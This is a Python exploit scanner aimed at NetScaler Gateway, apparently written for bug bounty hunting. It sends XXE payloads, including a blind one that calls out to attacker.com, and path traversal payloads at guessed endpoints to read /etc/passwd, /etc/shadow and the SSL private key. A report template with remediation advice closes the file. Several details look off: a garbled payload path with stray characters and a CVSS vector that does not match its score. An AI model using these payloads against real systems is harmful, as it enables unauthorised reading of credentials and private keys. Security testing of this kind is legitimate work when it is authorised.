#!/usr/bin/env python3
"""
XXE & Path Traversal Scanner - NetScaler
CVSS 4.0: 9.1 (CRITICAL)
Target: NetScaler Gateway

Description:
Tests for XXE (XML External Entity) and Path Traversal vulnerabilities
that can lead to cross-tenant data leak and system file access.
"""

import requests
import sys
from urllib.parse import quote

class XXEPathTraversalScanner:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        
        # XXE payloads
        self.xxe_payloads = [
            # Basic XXE
            """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",
            
            # Parameter entity XXE
            """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hosts">]>
%xxe;""",
            
            # Blind XXE with out-of-band
            """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe">]>
%xxe;""",
            
            # XXE via SOAP
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body><Query>&xxe;</Query></soap:Body>
</soap:Envelope>""",
        ]
        
        # Path traversal payloads
        self.path_payloads = [
            '/..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts',
            '/..%2f..%2f..%2f..%2fetc%2fpasswd',
            '/../../../../etc/passwd',
            '/../../../../etc/shadow',
            '/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '/etc/hosts',
            '/var/log/messages',
            '/var/netscaler/ssl/server.pem',
            '/flashq含/netscaler.xml',
        ]
        
        # XXE-vulnerable endpoints
        self.xxe_endpoints = [
            '/api/soap',
            '/cgi/xml',
            '/admin/config',
            '/vpn/portal',
            '/saml/acs',
            '/oauth/saml',
        ]
        
        # Path traversal vulnerable endpoints
        self.path_endpoints = [
            '/admin/download',
            '/cgi/file',
            '/cgi-bin/download',
            '/menu/getfile',
            '/admin/logs',
            '/vpn/download',
        ]
    
    def test_xxe(self, endpoint):
        """Test for XXE vulnerability"""
        print(f"\n[*] Testing XXE on: {endpoint}")
        
        for i, payload in enumerate(self.xxe_payloads):
            try:
                r = self.session.post(
                    f"{self.target}{endpoint}",
                    data=payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=15
                )
                
                # Check for file content leak
                leak_indicators = [
                    'root:', '/bin/bash', '/sbin/nologin',  # /etc/passwd
                    'root:$', 'encrypt',  # /etc/shadow
                    '127.0.0.1', 'localhost',  # /etc/hosts
                ]
                
                for indicator in leak_indicators:
                    if indicator in r.text:
                        print(f"[+] XXE VULNERABLE! Payload #{i+1}")
                        print(f"    Leaked content: {indicator}")
                        return {
                            'endpoint': endpoint,
                            'payload': f'XXE payload #{i+1}',
                            'leaked': indicator,
                            'vulnerable': True
                        }
                
                # Check for XXE errors
                xxe_errors = ['entity', 'external', 'XXE', 'ODATA', 'XML']
                for error in xxe_errors:
                    if error.lower() in r.text.lower() and r.status_code != 200:
                        print(f"[!] XXE potential indicator: {error}")
                        
            except Exception as e:
                continue
                
        return {'endpoint': endpoint, 'vulnerable': False}
    
    def test_path_traversal(self, endpoint):
        """Test for path traversal vulnerability"""
        print(f"\n[*] Testing Path Traversal on: {endpoint}")
        
        for payload in self.path_payloads:
            try:
                url = f"{self.target}{endpoint}?file={quote(payload)}"
                r = self.session.get(url, timeout=10)
                
                # Check for file content leak
                leak_indicators = [
                    '127.0.0.1', 'localhost',  # /etc/hosts
                    'root:', '/bin/bash', '/sbin/nologin',  # /etc/passwd
                    '-----BEGIN', 'PRIVATE KEY',  # SSL certs
                    'netscaler', 'NetScaler',  # config files
                ]
                
                for indicator in leak_indicators:
                    if indicator in r.text:
                        print(f"[+] Path Traversal VULNERABLE!")
                        print(f"    Payload: {payload}")
                        print(f"    Leaked: {indicator}")
                        return {
                            'endpoint': endpoint,
                            'payload': payload,
                            'leaked': indicator,
                            'vulnerable': True
                        }
                        
            except Exception as e:
                continue
                
        return {'endpoint': endpoint, 'vulnerable': False}
    
    def scan_all(self):
        """Scan for both XXE and Path Traversal"""
        print("\n[*] Starting vulnerability scan...")
        
        all_findings = []
        
        # Scan XXE
        print("\n" + "="*60)
        print("PHASE 1: XXE SCANNING")
        print("="*60)
        for endpoint in self.xxe_endpoints:
            result = self.test_xxe(endpoint)
            if result.get('vulnerable'):
                all_findings.append({'type': 'XXE', **result})
        
        # Scan Path Traversal
        print("\n" + "="*60)
        print("PHASE 2: PATH TRAVERSAL SCANNING")
        print("="*60)
        for endpoint in self.path_endpoints:
            result = self.test_path_traversal(endpoint)
            if result.get('vulnerable'):
                all_findings.append({'type': 'PATH_TRAVERSAL', **result})
        
        return all_findings
    
    def generate_report(self, findings):
        """Generate comprehensive report"""
        xxe_findings = [f for f in findings if f.get('type') == 'XXE']
        pt_findings = [f for f in findings if f.get('type') == 'PATH_TRAVERSAL']
        
        report = f"""
================================================================================
              XXE & PATH TRAVERSAL VULNERABILITY REPORT
================================================================================

Vulnerability: XXE & Path Traversal
Severity: CRITICAL (CVSS 4.0: 9.1)
Impact: Cross-tenant data leak / System file access

Target: {self.target}

--------------------------------------------------------------------------------
FINDING #1: XML EXTERNAL ENTITY (XXE)
--------------------------------------------------------------------------------
Status: {"VULNERABLE" if xxe_findings else "Not vulnerable"}
Endpoints tested: {len(self.xxe_endpoints)}
Vulnerabilities found: {len(xxe_findings)}

XXE Findings:
"""
        for f in xxe_findings:
            report += f"""
  Endpoint: {f['endpoint']}
    Payload: {f['payload']}
    Leaked Content: {f['leaked']}
"""
        
        report += f"""
--------------------------------------------------------------------------------
FINDING #2: PATH TRAVERSAL
--------------------------------------------------------------------------------
Status: {"VULNERABLE" if pt_findings else "Not vulnerable"}
Endpoints tested: {len(self.path_endpoints)}
Vulnerabilities found: {len(pt_findings)}

Path Traversal Findings:
"""
        for f in pt_findings:
            report += f"""
  Endpoint: {f['endpoint']}
    Payload: {f['payload']}
    Leaked Content: {f['leaked']}
"""
        
        report += f"""
--------------------------------------------------------------------------------
IMPACT ANALYSIS
--------------------------------------------------------------------------------
XXE Impact:
- Read internal system files (/etc/passwd, /etc/shadow)
- SSRF attacks against internal services
- Cross-tenant data exfiltration
- Potential for RCE via XXE

Path Traversal Impact:
- Read arbitrary system files
- Access SSL private keys
- Read configuration files containing credentials
- Information disclosure leading to further compromise

CVSS 4.0 Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
CVSS 4.0 Score: 9.1 (CRITICAL)

BOUNTY POTENTIAL: $5,000 (Critical) for XXE / $2,000 (High) for Path Traversal

--------------------------------------------------------------------------------
REMEDIATION
--------------------------------------------------------------------------------
XXE:
1. Disable XML external entity processing in parser
2. Use safe XML parsing libraries
3. Implement strict input validation for XML content
4. Apply security-conscious XML parser configuration

Path Traversal:
1. Implement whitelist-based path validation
2. Use realpath() to resolve and validate paths
3. Restrict file access to allowed directories only
4. Apply principle of least privilege for file access

================================================================================
"""
        return report

def main():
    print("""
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║  ██████╗ ███████╗██████╗ ███████╗██╗     ██╗ ██████╗████████╗           ║
║  ██╔══██╗██╔════╝██╔══██╗██╔════╝██║     ██║██╔════╝╚══██╔══╝           ║
║  ██║  ██║█████╗  ██████╔╝█████╗  ██║     ██║██║        ██║              ║
║  ██║  ██║██╔══╝  ██╔══██╗██╔══╝  ██║     ██║██║        ██║              ║
║  ██████╔╝███████╗██║  ██║███████╗███████╗██║╚██████╗   ██║              ║
║  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝   ╚═╝              ║
║                                                                           ║
║  XXE & Path Traversal Scanner                                             ║
║  NetScaler Gateway                                                       ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
""")
    
    if len(sys.argv) < 2:
        print(f"\nUsage: python3 {sys.argv[0]} <TARGET_URL>")
        print(f"\nExample: python3 {sys.argv[0]} https://vpn.target.com")
        sys.exit(1)
    
    target = sys.argv[1]
    scanner = XXEPathTraversalScanner(target)
    findings = scanner.scan_all()
    
    report = scanner.generate_report(findings)
    print(report)
    
    # Save report
    report_file = '/root/netscaler-bounty/xxe-poc/XXE_PATH_TRAVERSAL_REPORT.txt'
    with open(report_file, 'w') as f:
        f.write(report)
    print(f"[+] Report saved to: {report_file}")

if __name__ == "__main__":
    main()